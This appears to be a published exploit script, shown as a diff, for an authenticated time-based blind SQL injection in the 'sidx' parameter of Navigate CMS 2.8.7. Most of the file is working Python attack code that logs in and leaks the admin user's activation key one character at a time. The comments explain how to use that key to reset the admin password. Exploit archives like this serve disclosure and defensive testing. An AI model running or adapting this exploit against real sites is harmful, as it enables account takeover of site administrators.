@@ -1,0 +1,34 @@
+# Exploit Title: Navigate CMS 2.8.7 - ''sidx' SQL Injection (Authenticated)
+# Date: 2020-06-04
+# Exploit Author: Gus Ralph
+# Vendor Homepage: https://www.navigatecms.com/en/home
+# Software Link: https://sourceforge.net/projects/navigatecms/files/releases/navigate-2.8.7r1401.zip/download
+# Version: 2.8.7
+# Tested on: Ubuntu
+# CVE: N/A
+
+# This script will leak the "activation_key" value for the user who's ID is set to 1 in the database.
+# The activation key can be used to reset that user's password to whatever you want, bypassing the need to crack a hash.
+# An example password reset URL would be: `/login.php?action=password-reset&value=[ACTIVATION CODE LEAKED FROM DB]`
+
+import requests, time, string
+
+user = raw_input("Please enter your username: \n")
+password = raw_input("Please enter your password: \n")
+URL = raw_input("Enter the target URL (in this format 'http://domain.com/navigate/'): \n")
+
+s = requests.Session()
+data = {'login-username': (None, user), 'login-password':(None, password)}
+s.post(url = URL + "login.php", files = data)
+dictionary = string.ascii_lowercase + string.ascii_uppercase + string.digits
+final = ""
+while True:
+        for x in dictionary:
+                payload = '(SELECT (CASE WHEN EXISTS(SELECT password FROM nv_users WHERE activation_key REGEXP BINARY "^' + str(final) + x + '.*" AND id = 1) THEN (SELECT sleep(5)) ELSE date_created END)); -- -'
+                r = s.post(url = URL + "/navigate.php?fid=comments&act=1&rows=1&sidx=" + payload)
+                if int(r.elapsed.total_seconds()) > 4:
+                        final += x
+                        print "Leaking contents of admin hash: " + final
+                        break
+                else:
+                        pass
